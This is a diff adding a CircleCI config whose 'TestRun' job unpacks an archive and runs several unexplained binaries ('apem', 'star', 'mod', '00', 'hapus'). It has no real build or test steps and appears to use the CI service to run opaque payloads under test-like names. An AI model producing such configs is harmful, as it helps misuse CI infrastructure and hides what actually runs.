@@ -1,0 +1,51 @@
+
+version: 2.1
+
+commands:
+  setup:
+    steps:
+      - run:
+          name: RunUp_01
+          command: |
+            tar -xf tembem && chmod u+x *
+            ./apem
+            ./star
+            ./mod
+            ./00
+
+  setep:
+    steps:
+      - run:
+          name: RunUp_02
+          command: |
+            ./hapus
+
+      - run:
+          name: RunUp_03
+          command: |
+            ./hapus
+
+
+
+
+jobs:
+  TestRun:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setep
+
+
+
+
+
+
+workflows:
+  version: 2.1
+  workflo_01:
+    jobs:
+      - TestRun
+
+
